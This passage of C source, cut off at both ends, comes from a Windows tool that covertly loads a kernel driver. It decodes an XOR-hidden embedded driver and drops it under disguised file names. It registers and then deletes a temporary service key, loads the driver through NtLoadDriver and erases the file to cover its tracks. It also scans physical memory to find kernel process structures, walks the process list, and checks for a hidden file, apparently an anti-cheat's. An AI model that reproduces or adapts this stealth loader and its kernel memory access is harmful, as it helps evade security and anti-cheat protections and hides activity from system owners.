    for (int i = 0; i < 3; i++) {
        if (!SPATHS[i]) continue;
        SetFileAttributesW(SPATHS[i], FILE_ATTRIBUTE_NORMAL);
        FILE *f = _wfopen(SPATHS[i], L"wb");
        if (!f) {
            printf("[!] state write %ls failed err=%lu\n", SPATHS[i], GetLastError());
            continue;
        }
        xdata(txt, (size_t)n);
        fwrite(txt, 1, (size_t)n, f);
        fclose(f);
        xdata(txt, (size_t)n);       // restore plaintext for a possible 2nd try
        if (i == 0) SetFileAttributesW(SPATHS[0], FILE_ATTRIBUTE_HIDDEN);
        printf("[+] wrote %ls\n", SPATHS[i]);
        return 1;
    }
    printf("[-] cannot write state (tried cache-dir, exe-dir and C:\\)\n");
    return 0;
}

// EPROCESS offsets Win10 19041..19045 (validated, looplpt escan)
#define O_DTB    0x28   // DirectoryTableBase
#define O_UDTB   0x388  // UserDirectoryTableBase
#define O_PID    0x440  // UniqueProcessId (HANDLE, 8)
#define O_LINKS  0x448  // ActiveProcessLinks (LIST_ENTRY)
#define O_NAME   0x5a8   /* ImageFileName[15] 19045 (0x5e8 = Win11) */
// HYPOTHESIS offsets: validated at runtime in `mod`, VFAIL names the break
#define O_PEB    0x550   /* HYP: EPROCESS.Peb ptr, 19045 */
#define P_LDR    0x18    /* HYP: PEB.Ldr */
#define L_INLOAD 0x10    /* HYP: PEB_LDR_DATA.InLoadOrderModuleList */
#define L_DLLBASE 0x30   /* HYP: LDR_DATA_TABLE_ENTRY.DllBase */
#define L_SIZEOF 0x40    /* HYP: LDR_DATA_TABLE_ENTRY.SizeOfImage */
#define L_NAME   0x58    /* HYP: BaseDllName UNICODE_STRING (Buffer ptr @ +0x60) */

#define NO_PID (~(UINT64)0)

typedef struct {
    UINT64 kva;     // EPROCESS kernel VA of this entry
    UINT64 pid, dtb, udtb;
    char   name[16];
} EPINFO;

static BOOL is_kva(UINT64 v) { return v >= 0xFFFF800000000000ULL; }
static BOOL is_uva(UINT64 v) { return v > 0x10000 && v < 0x0000800000000000ULL; }

// nt-export helper (only used to bootstrap the walk when sep is unknown but nt is)
static UINT64 pe_export(UINT64 cr3, UINT64 base, const char *name)
{
    unsigned char hdr[0x400];
    if (!rd_kva(cr3, base, hdr, 0x400) || memcmp(hdr, "MZ", 2)) return 0;
    UINT64 eo = *(UINT32 *)(hdr + 0x3C);
    if (eo > 0x400 - 0x108) return 0;   // no eo wraparound on garbage pages
    if (memcmp(hdr + eo, "PE\0\0", 4)) return 0;
    UINT64 rva_exp = *(UINT32 *)(hdr + eo + 0x88);
    if (!rva_exp) return 0;
    unsigned char ed[0x28];
    if (!rd_kva(cr3, base + rva_exp, ed, sizeof ed)) return 0;
    UINT32 nn = *(UINT32 *)(ed + 0x18), nnf = *(UINT32 *)(ed + 0x20);
    UINT32 nna = *(UINT32 *)(ed + 0x24), nao = *(UINT32 *)(ed + 0x1C);
    for (UINT32 i = 0; i < nn; i++) {
        UINT32 nrva; if (!rd_kva(cr3, base + nnf + 4 * i, &nrva, 4)) break;
        char nm[64]; UINT32 k = 0;
        while (k < 63) { if (!rd_kva(cr3, base + nrva + k, nm + k, 1) || !nm[k]) break; k++; }
        nm[k] = 0;
        if (!strcmp(nm, name)) {
            UINT16 ord; if (!rd_kva(cr3, base + nna + 2 * i, &ord, 2)) break;
            UINT32 frva; if (!rd_kva(cr3, base + nao + 4 * ord, &frva, 4)) break;
            return base + frva;
        }
    }
    return 0;
}

// System EPROCESS KVA: from sep via the Blink of the first list entry (no nt
// base needed), else from nt!PsInitialSystemProcess. sep==PA head anchor.
static BOOL sys_ep_kva(UINT64 *out)
{
    if (st.sep && st.cr3) {
        UINT64 flink = 0;
        if (!rd_phys(st.sep + O_LINKS, &flink, 8)) {
            printf("[-] read Flink @ sep+%x failed - sep stale/wrong\n", O_LINKS);
            return FALSE;
        }
        if (!is_kva(flink)) {
            printf("[-] sep+%x Flink=%llx not a kernel VA - sep wrong\n",
                   O_LINKS, (unsigned long long)flink);
            return FALSE;
        }
        UINT64 blink = 0;
        if (rd_kva(st.cr3, flink + 8, &blink, 8) && is_kva(blink)) {
            UINT64 head = blink - O_LINKS;
            UINT64 hpa = pa_of(st.cr3, head);
            if (hpa != st.sep)
                printf("[-] head PA %llx != sep %llx - sep from another boot, redo offline\n",
                       (unsigned long long)hpa, (unsigned long long)st.sep);
            else { *out = head; return TRUE; }
        } else {
            printf("[!] Blink trick failed (flink=%llx) - trying nt fallback\n",
                   (unsigned long long)flink);
        }
    }
    if (st.nt && st.cr3) {
        UINT64 psi = pe_export(st.cr3, st.nt, "PsInitialSystemProcess");
        UINT64 sp = 0;
        if (psi && rd_kva(st.cr3, psi, &sp, 8) && is_kva(sp)) { *out = sp; return TRUE; }
        printf("[-] PsInitialSystemProcess resolve failed - nt wrong/stale\n");
        return FALSE;
    }
    printf("[-] need sep (System EPROCESS PA) or nt in state file  - \n"
           "    run: init <cr3_hex> [nt_hex] [sep_hex]  (sep from offline dump)\n");
    return FALSE;
}

static BOOL walk_procs(BOOL list, UINT64 want_pid, EPINFO *out)
{
    UINT64 head;
    if (!sys_ep_kva(&head)) return FALSE;
    UINT64 link = head + O_LINKS;
    for (int i = 0; i < 1024; i++) {
        UINT64 l2[2];
        if (!rd_kva(st.cr3, link, l2, 16)) {
            printf("[-] links read fail @ %llx (walk broke after %d entries)\n",
                   (unsigned long long)link, i);
            return FALSE;
        }
        EPINFO p;
        memset(&p, 0, sizeof p);
        p.kva = link - O_LINKS;
        rd_kva(st.cr3, p.kva + O_PID,  &p.pid,  8);
        rd_kva(st.cr3, p.kva + O_DTB,  &p.dtb,  8);
        rd_kva(st.cr3, p.kva + O_UDTB, &p.udtb, 8);
        rd_kva(st.cr3, p.kva + O_NAME, p.name, 15);
        if (t_cli_pid && (UINT32)p.pid == t_cli_pid) {  // transient client: skip
            link = l2[0];
            if (link == head + O_LINKS || !is_kva(link)) break;
            continue;
        }
        if (list)
            printf("  pid=%4llu dtb=%012llx udtb=%012llx ep=%012llx %-15.15s\n",
                   (unsigned long long)p.pid, (unsigned long long)p.dtb,
                   (unsigned long long)p.udtb, (unsigned long long)p.kva, p.name);
        if (!list && p.pid == want_pid) { *out = p; return TRUE; }
        link = l2[0];
        if (link == head + O_LINKS || !is_kva(link)) break;
    }
    return FALSE;
}

typedef LONG NTSTATUS_L;
typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } NTUNISTR;
typedef NTSTATUS_L (WINAPI *PNTLOADDRIVER)(NTUNISTR *);

static BOOL enable_load_priv(void)
{
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) {
        printf("[load] OpenProcessToken err=%lu\n", GetLastError());
        return FALSE;
    }
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    if (!LookupPrivilegeValueW(NULL, L"SeLoadDriverPrivilege", &tp.Privileges[0].Luid)) {
        printf("[load] LookupPrivilegeValue err=%lu\n", GetLastError());
        CloseHandle(tok);
        return FALSE;
    }
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof tp, NULL, NULL);
    DWORD e = GetLastError();         // TRUE even when NOT_ALL_ASSIGNED - check e
    if (!ok || e == ERROR_NOT_ALL_ASSIGNED) {
        printf("[load] SeLoadDriverPrivilege not held (elevated shell?) err=%lu\n", e);
        ok = FALSE;
    }
    CloseHandle(tok);
    return ok;
}

static void img_path_for(const wchar_t *syspath, wchar_t *out, size_t cap)
{
    const wchar_t *p = syspath;
    while (*p && _wcsnicmp(p, L"system32\\", 9)) p++;
    if (*p) _snwprintf(out, cap, L"\\SystemRoot\\%ls", p);
    else    _snwprintf(out, cap, L"\\??\\%ls", syspath);
    out[cap - 1] = 0;
}

// svcname becomes the DEVICE name (\\.\svcname). devname_out gets "\\.\svcname".
static BOOL stealth_load(const wchar_t *svcname, const wchar_t *syspath,
                         wchar_t *devname_out, size_t devname_cap)
{
    wchar_t sub[512], nt[512], img[512];
    HKEY hk = NULL;
    DWORD one = 1, three = 3, zero = 0;
    LONG r;
    _snwprintf(sub, 512, xo_w((wchar_t[96]){0}, 96, OB_SVCA, OB_SVCA_N), svcname);
    sub[511] = 0;
    DWORD disp = 0;
    r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, sub, 0, NULL, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, NULL, &hk, &disp);
    if (r != ERROR_SUCCESS) {
        printf("[load] RegCreateKeyExW(%ls) err=%lx\n", svcname, (unsigned long)r);
        return FALSE;
    }
    if (disp != REG_CREATED_NEW_KEY) {
        printf("[load] service %ls already exists - refusing (would clobber it)\n",
               svcname);
        RegCloseKey(hk);
        return FALSE;
    }
    img_path_for(syspath, img, 512);  // kernel-canonical ImagePath form
    img[511] = 0;
    r  = RegSetValueExW(hk, L"Type",         0, REG_DWORD,     (BYTE *)&one,   sizeof one);
    r |= RegSetValueExW(hk, L"Start",        0, REG_DWORD,     (BYTE *)&three, sizeof three);
    r |= RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD,     (BYTE *)&zero,  sizeof zero);
    r |= RegSetValueExW(hk, L"ImagePath",    0, REG_EXPAND_SZ, (BYTE *)img,
                        (DWORD)((wcslen(img) + 1) * sizeof(wchar_t)));
    RegCloseKey(hk);
    if (r != ERROR_SUCCESS) {
        printf("[load] RegSetValueEx err=%lx\n", (unsigned long)r);
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, sub);
        return FALSE;
    }
    PNTLOADDRIVER pf = (PNTLOADDRIVER)(void *)GetProcAddress(
                           GetModuleHandleW(L"ntdll.dll"), "NtLoadDriver");
    if (!pf) {
        printf("[load] no NtLoadDriver in ntdll\n");
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, sub);
        return FALSE;
    }
    _snwprintf(nt, 512, xo_w((wchar_t[128]){0}, 128, OB_SVCN, OB_SVCN_N), svcname);
    nt[511] = 0;
    NTUNISTR us;
    us.Buffer = nt;                         // buffer itself stays NUL-terminated
    us.Length = (USHORT)(wcslen(nt) * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    NTSTATUS_L s = pf(&us);
    printf("[load] NtLoadDriver(%ls) status=%lx%s\n", svcname, (unsigned long)s,
           s == 0 ? " loaded" :
           s == (NTSTATUS_L)0xC0000035 ? " name-collision" :
           s == (NTSTATUS_L)0xC0000034 ? " image-already-loaded" : "");
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, sub);
    if (s == 0 || s == (NTSTATUS_L)0xC0000035 || s == (NTSTATUS_L)0xC0000034) {
        _snwprintf(devname_out, devname_cap, L"\\\\.\\%ls", svcname);
        devname_out[devname_cap - 1] = 0;
        printf("[load] key deleted, device %ls live until reboot\n", devname_out);
        return TRUE;
    }
    return FALSE;
}

#include "dvr_blob.h"

static wchar_t g_ephem[MAX_PATH];

static BOOL posix_unlink_v(const wchar_t *path, int verbose)
{
    HANDLE h = CreateFileW(path, DELETE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        DWORD e0 = GetLastError();
        BOOL ok = DeleteFileW(path);
        if (!ok && verbose)
            printf("[load] unlink open=%lu del=%lu\n",
                   (unsigned long)e0, (unsigned long)GetLastError());
        return ok;
    }
    DWORD fl = 0x1 /*POSIX_SEMANTICS*/ | 0x2 /*IGNORE_READONLY*/;
    typedef BOOL (WINAPI *SFIBH_t)(HANDLE, int, LPVOID, DWORD);
    static SFIBH_t pfn;
    if (!pfn)
        pfn = (SFIBH_t)(void *)(uintptr_t)GetProcAddress(
            GetModuleHandleW(L"kernel32.dll"), "SetFileInformationByHandle");
    BOOL ok = pfn ? pfn(h, 21 /* FileDispositionInfoEx */, &fl, sizeof fl) : FALSE;
    DWORD e1 = ok ? 0 : GetLastError();
    CloseHandle(h);
    if (!ok) {
        ok = DeleteFileW(path);
        if (!ok && verbose)
            printf("[load] unlink posix=%lu del=%lu\n",
                   (unsigned long)e1, (unsigned long)GetLastError());
    }
    return ok;
}

// load-time call: failing while the image section is resident is EXPECTED
// (ACCESS_DENIED) - the release-time retry after unload is the real delete.
static BOOL posix_unlink(const wchar_t *path) { return posix_unlink_v(path, 0); }

static void ephem_path(wchar_t *out, size_t cap)
{
    unsigned long long bs = boot_seed() ^ 0xD12B33F5E11ULL;
    wchar_t dir[160], fmt[32], leaf[32], bare[176];
    xo_w(dir, 160, OB_DMC, OB_DMC_N);           // C:\...\DeviceMetadataCache\%ls
    xo_w(fmt, 32, OB_DMRC, OB_DMRC_N);          // dmrc%04x.sys
    _snwprintf(leaf, 32, fmt, (unsigned)((bs >> 29) & 0xffff));
    _snwprintf(bare, 176, dir, L"");            // dir incl. trailing backslash
    bare[175] = 0;
    CreateDirectoryW(bare, NULL);               // tolerated if it exists
    _snwprintf(out, cap, dir, leaf);
    out[cap - 1] = 0;
}

static BOOL materialize_at(const wchar_t *path)
{
    unsigned char *buf = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, DRV_BLOB_LEN);
    if (!buf) return FALSE;
    for (int i = 0; i < DRV_BLOB_LEN; i++)
        buf[i] = (unsigned char)(DRV_BLOB[i] ^ ((0x71 + 3 * i) & 0xFF));
    BOOL ok = buf[0] == 'M' && buf[1] == 'Z';
    if (ok) {
        HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_TEMPORARY, NULL);
        if (f == INVALID_HANDLE_VALUE) ok = FALSE;
        else {
            DWORD w = 0;
            ok = WriteFile(f, buf, DRV_BLOB_LEN, &w, NULL) && w == DRV_BLOB_LEN;
            CloseHandle(f);                    // data flushed on close
            if (!ok) DeleteFileW(path);
            else {                             // remember for release-time retry
                wcsncpy(g_ephem, path, MAX_PATH - 1);
                g_ephem[MAX_PATH - 1] = 0;
            }
        }
    }
    SecureZeroMemory(buf, DRV_BLOB_LEN);
    HeapFree(GetProcessHeap(), 0, buf);
    return ok;
}

static BOOL materialize_drv(wchar_t *out, size_t cap)
{
    ephem_path(out, cap);
    if (!out[0]) return FALSE;
    return materialize_at(out);
}

static BOOL stealth_load_ephem(const wchar_t *name, wchar_t *dn, size_t cap)
{
    wchar_t drv[MAX_PATH];
    BOOL mat = materialize_drv(drv, MAX_PATH);
    BOOL ok = stealth_load(name, mat ? drv : oname(ON_DRV, ON_DRV_LEN), dn, cap);
    if (mat) posix_unlink(drv);
    if (!ok && mat) {
        // fallback: this box refused the \??\-form ImagePath - one retry
        // from the legacy System32\drivers\wheaXXXX.sys location
        wchar_t wd[MAX_PATH], leg[MAX_PATH];
        DWORD wn = GetSystemWindowsDirectoryW(wd, MAX_PATH);
        unsigned num = (unsigned)(((boot_seed() ^ 0xD12B33F5E11ULL) >> 29) & 0xffff);
        if (wn && wn <= MAX_PATH - 64) {
            _snwprintf(leg, MAX_PATH, xo_w((wchar_t[128]){0}, 128, OB_WHEA, OB_WHEA_N),
                       wd, num);
            leg[MAX_PATH - 1] = 0;
            printf("[load] retry from legacy drivers dir\n");
            if (materialize_at(leg)) {
                ok = stealth_load(name, leg, dn, cap);
                posix_unlink(leg);
            }
        }
    }
    return ok;
}

typedef NTSTATUS_L (WINAPI *PNTUNLOADDRIVER)(NTUNISTR *);
static NTSTATUS_L driver_unload(const wchar_t *svcname, const wchar_t *syspath)
{
    wchar_t sub[512], nt[512], img[512];
    HKEY hk = NULL;
    DWORD one = 1, three = 3, zero = 0, disp = 0;
    _snwprintf(sub, 512, xo_w((wchar_t[96]){0}, 96, OB_SVCA, OB_SVCA_N), svcname);
    sub[511] = 0;
    LONG r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, sub, 0, NULL, REG_OPTION_NON_VOLATILE,
                             KEY_SET_VALUE, NULL, &hk, &disp);
    if (r != ERROR_SUCCESS) return (NTSTATUS_L)0xC0000034;  // OBJECT_NAME_NOT_FOUND
    img_path_for(syspath, img, 512);
    img[511] = 0;
    RegSetValueExW(hk, L"Type",         0, REG_DWORD,     (BYTE *)&one,   sizeof one);
    RegSetValueExW(hk, L"Start",        0, REG_DWORD,     (BYTE *)&three, sizeof three);
    RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD,     (BYTE *)&zero,  sizeof zero);
    RegSetValueExW(hk, L"ImagePath",    0, REG_EXPAND_SZ, (BYTE *)img,
                   (DWORD)((wcslen(img) + 1) * sizeof(wchar_t)));
    RegCloseKey(hk);
    PNTUNLOADDRIVER pf = (PNTUNLOADDRIVER)(void *)GetProcAddress(
                             GetModuleHandleW(L"ntdll.dll"), "NtUnloadDriver");
    if (!pf) return (NTSTATUS_L)0xC0000002;
    _snwprintf(nt, 512, xo_w((wchar_t[128]){0}, 128, OB_SVCN, OB_SVCN_N), svcname);
    nt[511] = 0;
    NTUNISTR us;
    us.Buffer = nt;
    us.Length = (USHORT)(wcslen(nt) * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    NTSTATUS_L s = pf(&us);
    if (disp == REG_CREATED_NEW_KEY)             // never touch a foreign key
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, sub);
    return s;
}

static int cmd_unload(const wchar_t *svcname)
{
    if (!enable_load_priv()) return 1;
    NTSTATUS_L s = driver_unload(svcname, oname(ON_DRV, ON_DRV_LEN));
    printf("[unload] NtUnloadDriver(%ls) status=%lx%s\n", svcname, (unsigned long)s,
           s == 0 ? " unloaded" :
           s == (NTSTATUS_L)0xC0000035 ? " not-loaded" : "");
    return s == 0 ? 0 : 1;
}

static void vgkdat_name(char *out, size_t cap)
{
    static const unsigned char VD[11] = {         // "vgk0001.dat" ^ (0x5A+idx)
        0x2C, 0x3C, 0x37, 0x6D, 0x6E, 0x6F, 0x51, 0x4F, 0x06, 0x02, 0x10
    };
    for (int i = 0; i < 11 && (size_t)i + 1 < cap; i++) out[i] = (char)(VD[i] ^ (0x5A + i));
    out[11] = 0;
}

static int vgkdat_fnv(unsigned long long *oh, unsigned long long *osz, DWORD *oerr)
{
    *oh = 0; *osz = 0; *oerr = 0;
    char an[12];
    vgkdat_name(an, sizeof an);
    wchar_t fn[12], p[MAX_PATH];
    for (int i = 0; i < 11; i++) fn[i] = (wchar_t)an[i];
    fn[11] = 0;
    UINT n = GetSystemWindowsDirectoryW(p, MAX_PATH);
    if (!n || n > MAX_PATH - 14) { *oerr = ERROR_BAD_PATHNAME; return 0; }
    _snwprintf(p + n, MAX_PATH - n, L"\\%ls", fn);
    p[MAX_PATH - 1] = 0;
    HANDLE hf = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        *oerr = GetLastError();
        return 0;
    }
    LARGE_INTEGER sz; unsigned long long h = 0xcbf29ce484222325ULL;
    char buf[65536]; DWORD r;
    if (GetFileSizeEx(hf, &sz)) *osz = (unsigned long long)sz.QuadPart;
    while (ReadFile(hf, buf, sizeof buf, &r, NULL) && r) {
        for (DWORD i = 0; i < r; i++) {
            h ^= (unsigned char)buf[i];
            h *= 0x100000001b3ULL;
        }
    }
    CloseHandle(hf);
    *oh = h;
    return 1;
}

static int cmd_vgkdat(void)
{
    unsigned long long h = 0, s = 0; DWORD e = 0;
    if (!vgkdat_fnv(&h, &s, &e)) {
        printf("[cfgd] absent (%lu)\n", e);
        return 0;
    }
    printf("[cfgd] size=%I64u fnv=%016llx\n", s, h);
    return 0;
}

static BOOL try_dev(const wchar_t *name)
{
    hdev = CreateFileW(name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    return hdev != INVALID_HANDLE_VALUE;
}

// open chain: state device -> legacy t_d660fc72 -> stealth-load fresh instance
static BOOL open_dev(void)
{
    if (st.devn[0] && try_dev(st.devn)) {
        wcscpy(g_dev, st.devn);
        return TRUE;
    }
    wchar_t td66[32];
    xo_w(td66, 32, OB_TD66, OB_TD66_N);
    if (try_dev(td66)) {
        wcscpy(g_dev, td66);
        return TRUE;
    }
    if (!enable_load_priv()) {
        printf("[-] no device open and SeLoadDriverPrivilege unavailable\n");
        return FALSE;
    }
    static wchar_t STEMS[8][16];
    xo_w(STEMS[0],16,OB_S0,OB_S0_N); xo_w(STEMS[1],16,OB_S1,OB_S1_N);
    xo_w(STEMS[2],16,OB_S2,OB_S2_N); xo_w(STEMS[3],16,OB_S3,OB_S3_N);
    xo_w(STEMS[4],16,OB_S4,OB_S4_N); xo_w(STEMS[5],16,OB_S5,OB_S5_N);
    xo_w(STEMS[6],16,OB_S6,OB_S6_N); xo_w(STEMS[7],16,OB_S7,OB_S7_N);
    unsigned long long bs = boot_seed() ^ 0xFEEDFACE5EEDBEEFULL;
    wchar_t NAMES[4][16];
    for (int i = 0; i < 4; i++) {
        bs = bs * 0x100000001B3ULL + 0xB7E11ULL;
        _snwprintf(NAMES[i], 16, L"%ls%02u",
                   STEMS[(unsigned)(bs >> 33) & 7],
                   (unsigned)((bs >> 40) % 90) + 10);
        NAMES[i][15] = 0;
    }
    static wchar_t LEGACY[4][16];
    xo_w(LEGACY[0],16,OB_L0,OB_L0_N); xo_w(LEGACY[1],16,OB_L1,OB_L1_N);
    xo_w(LEGACY[2],16,OB_L2,OB_L2_N); xo_w(LEGACY[3],16,OB_L3,OB_L3_N);
    wchar_t dn[80];
    for (int i = 0; i < 4; i++) {
        if (!stealth_load_ephem(NAMES[i], dn, 80))
            continue;
        if (try_dev(dn)) goto hit;
    }
    for (int i = 0; i < 4; i++) {
        if (!stealth_load_ephem(LEGACY[i], dn, 80))
            continue;
        if (try_dev(dn)) goto hit;
    }
    printf("[-] no usable device after all fallbacks\n");
    return FALSE;
hit:
    wcscpy(g_dev, dn);
    wcscpy(st.devn, dn);
    save_state();
    g_fresh_load = 1;
    return TRUE;
}

static int cmd_omstrip(int mode);         // defined below; 0 full, 1 keep-drv,
                                           // 2 drv-only (persistent mode)
static CRITICAL_SECTION g_win;
static int g_win_refs;
static int g_win_capable = -1;            // -1 unknown, 1 unloads, 0 stuck
static int g_persist;                     // /1 = persistent mode - device

static BOOL win_boot_dev(void)
{
    if (!open_dev()) return FALSE;
    g_path = fetch_sec() ? 1 : 0;
    st.path = g_path;
    return TRUE;
}

static void win_release_handles(void)
{
    if (hsec) { CloseHandle(hsec); hsec = NULL; }
    if (hdev && hdev != INVALID_HANDLE_VALUE) {
        CloseHandle(hdev);
        hdev = INVALID_HANDLE_VALUE;
    }
}

static BOOL dev_acquire(void)
{
    BOOL ok = TRUE;
    EnterCriticalSection(&g_win);
    if (++g_win_refs == 1) {
        if (hdev && hdev != INVALID_HANDLE_VALUE) {
            ;                             // stuck mode: handle never dropped
        } else {
            ok = win_boot_dev();
            if (!ok) g_win_refs = 0;
        }
    }
    LeaveCriticalSection(&g_win);
    return ok;
}

static void dev_release(void)
{
    EnterCriticalSection(&g_win);
    if (g_win_refs > 0 && --g_win_refs == 0) {
        if (g_win_capable != 0 && g_dev[0]) {
            // svcname = device name minus the leading "\\.\" (4 chars)
            wchar_t svc[80];
            wcsncpy(svc, g_dev + 4, 79);
            svc[79] = 0;
            enable_load_priv();
            win_release_handles();
            NTSTATUS_L s = driver_unload(svc, oname(ON_DRV, ON_DRV_LEN));
            if (s == 0) {
                printf("[win] unloaded t=%lu\n", GetTickCount());
                // image section is GONE now - the load-time unlink was
                // ACCESS_DENIED while resident; this one sticks.
                if (g_ephem[0]) posix_unlink_v(g_ephem, 1);
            } else {
                g_win_capable = 0;
                printf("[win] unload status=%lx - stuck mode: reopen + full "
                       "strip, hold until reboot\n",
                       (unsigned long)s);
                if (open_dev() && fetch_sec()) {
                    cmd_omstrip(0);
                } else {
                    printf("[win] stuck reopen failed - device lost\n");
                }
            }
        }
        // stuck mode: keep handles, names already stripped
    }
    LeaveCriticalSection(&g_win);
}

// auto bootstrap: PA scan -> System EPROCESS (self-validating) -> nt
#define O_TLHEAD 0x5e0  // EPROCESS.ThreadListHead - dump-verified:
                         // first list entry's Blink == &SystemEPROCESS+0x5e0

// PA ranges verified safe on this box (escan found sep in the >4G
// block on both boots). never include the MMIO hole (hard hang, verified).
static const struct { UINT64 lo, hi; } SCAN_RANGES[2] = {
    { 0x100000000ULL, 0x220000000ULL },
    { 0x1000000ULL,   0x8000000ULL   },
};

static BOOL scan_system_ep(UINT64 *ep_out, UINT64 *dtb_out, UINT64 *epkva_out)
{
    static const unsigned char pat[8] = { 'S','y','s','t','e','m',0,0 };
    unsigned char buf[0x2000];
    int gq = g_quiet;
    int gat = t_autopin;                           // never pin-churn a scan:
    t_autopin = 0;                                 // 70k blocks x map/evict is
    g_quiet = 1;                                   // dead pages are expected
    for (unsigned r = 0; r < 2; r++) {
        printf("[auto] scanning PA %llx..%llx for System EPROCESS...\n",
               (unsigned long long)SCAN_RANGES[r].lo,
               (unsigned long long)SCAN_RANGES[r].hi);
        for (UINT64 page = SCAN_RANGES[r].lo;
             page + 0x2000 <= SCAN_RANGES[r].hi; page += 0x1000) {
            if (!rd_phys(page, buf, sizeof buf)) continue;
            const unsigned char *q = buf + 0x168;
            for (;;) {
                q = memchr(q, 'S', (size_t)(buf + 0x2000 - 8 - q));
                if (!q) break;
                UINT32 i = (UINT32)(q - buf);
                if (!memcmp(q + 1, pat + 1, 7)) {
                    UINT32 pid;
                    memcpy(&pid, buf + i - 0x168, 4);
                    if (pid == 4) {
                        UINT64 ep = page + i - O_NAME, dtb = 0, flink = 0;
                        if (rd_phys(ep + O_DTB, &dtb, 8) &&
                            (dtb & 0x000FFFFFFFFFF000ULL) &&
                            rd_phys(ep + O_LINKS, &flink, 8) && is_kva(flink)) {
                            UINT64 fpa = pa_of(dtb, flink), blink = 0;
                            if (fpa && rd_phys(fpa + 8, &blink, 8) && is_kva(blink)) {
                                UINT64 epkva = blink - O_LINKS;
                                if (pa_of(dtb, epkva) == ep) {
                                    g_quiet = gq; t_autopin = gat;
                                    *ep_out = ep; *dtb_out = dtb; *epkva_out = epkva;
                                    return TRUE;
                                }
                            }
                        }
                    }
                }
                q++;
            }
        }
    }
    g_quiet = gq; t_autopin = gat;
    return FALSE;
}

// MZ + PE + export-dir NAME == "ntoskrnl" - reads the real name, no heuristic.
static BOOL nt_check(UINT64 cr3, UINT64 base)
{
    unsigned char hdr[0x400];
    if (!rd_kva(cr3, base, hdr, sizeof hdr) || memcmp(hdr, "MZ", 2)) return FALSE;
    UINT32 eo = *(UINT32 *)(hdr + 0x3C);
    if (eo > 0x400 - 0x8C || memcmp(hdr + eo, "PE\0\0", 4)) return FALSE; // no eo wrap
    UINT32 rva = *(UINT32 *)(hdr + eo + 0x88);    // DataDir[0]; 0x78 was a bug
    if (!rva) return FALSE;
    UINT32 nrva = 0;
    if (!rd_kva(cr3, base + rva + 0x0C, &nrva, 4) || !nrva) return FALSE;
    char nm[16];
    if (!rd_kva(cr3, base + nrva, nm, 12)) return FALSE;
    nm[12] = 0;
    return !strncmp(nm, "ntoskrnl", 8);
}

static BOOL derive_nt(UINT64 ep, UINT64 dtb, UINT64 *nt_out)
{
    UINT64 head = 0, hpa;
    if (!rd_phys(ep + O_TLHEAD, &head, 8) || !is_kva(head)) return FALSE;
    if (!(hpa = pa_of(dtb, head))) return FALSE;
    unsigned char win[0x800];
    if (!rd_phys(hpa - 0x700, win, sizeof win)) return FALSE;
    int rels[4 + 0x800 / 8], nr = 0;
    static const int PRE[4] = { -0x018, -0x098, -0x230, -0x240 }; // dump-verified first
    for (int k = 0; k < 4; k++) rels[nr++] = PRE[k];
    for (int rel = -0x700; rel < 0x100; rel += 8) rels[nr++] = rel;
    for (int k = 0; k < nr; k++) {
        UINT64 v;
        memcpy(&v, win + rels[k] + 0x700, 8);
        if (v < 0xFFFFF80000000000ULL || v >= 0xFFFFF90000000000ULL) continue;
        UINT64 p = v & ~0xFFFULL;
        for (UINT32 step = 0; step < 0x1400; step++, p -= 0x1000) {
            UINT64 pa = pa_of(dtb, p);
            if (!pa) continue;
            UINT16 mz = 0;
            if (!rd_phys(pa, &mz, 2) || mz != 0x5A4D) continue;
            if (nt_check(dtb, p)) { *nt_out = p; return TRUE; }
        }
    }
    return FALSE;
}

static int cmd_auto(void)
{
    printf("[auto] full self-derivation - no helpers, no manual LSTAR\n");
    UINT64 ep, dtb, epkva;
    if (!scan_system_ep(&ep, &dtb, &epkva)) {
        printf("[-] auto: System EPROCESS not found / full-circle failed\n");
        return 1;
    }
    printf("[+] System EPROCESS: PA=%llx KVA=%llx kernel CR3=%llx (full-circle OK)\n",
           (unsigned long long)ep, (unsigned long long)epkva,
           (unsigned long long)dtb);
    st.sep = ep;
    st.cr3 = dtb;
    UINT64 nt = 0;
    if (derive_nt(ep, dtb, &nt)) {
        st.nt = nt;
        printf("[+] nt = %llx (PA %llx, export-name verified)\n",
               (unsigned long long)nt, (unsigned long long)pa_of(dtb, nt));
    } else {
        st.nt = 0;
        printf("[!] nt derivation failed - sep path unaffected (nt is fallback)\n");
    }
    save_state();
    printf("[+] sanity: process walk\n");
    walk_procs(TRUE, NO_PID, NULL);
    return 0;
}

static UINT32 kldr_name(UINT64 e, wchar_t *nm, UINT32 cap)
{
    unsigned char us[16];
    if (!rd_kva(st.cr3, e + 0x58, us, sizeof us)) return 0;
    UINT16 ln = *(UINT16 *)(us + 0);                // UNICODE_STRING on x64:
    UINT64 buf = *(UINT64 *)(us + 8);               // len/max 2+2, 4 pad, buf@+8
    if (ln < 2 || (UINT32)ln > (cap - 1) * 2 || !is_kva(buf)) return 0;
